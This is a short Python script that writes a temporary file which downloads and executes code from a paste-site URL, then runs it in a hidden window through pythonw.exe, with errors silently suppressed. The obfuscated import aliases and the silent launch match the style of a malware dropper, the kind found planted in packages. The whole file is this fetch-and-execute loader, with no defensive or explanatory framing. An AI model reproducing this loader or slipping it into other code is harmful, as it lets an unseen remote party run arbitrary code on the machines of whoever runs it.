from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem

def execute_remote():

    _ttmp = _ffile(delete=False)
    _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://rentry.co/cool/raw').read())""")
    _ttmp.close()
    try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
    except: pass

if __name__ == "__main__":
    execute_remote()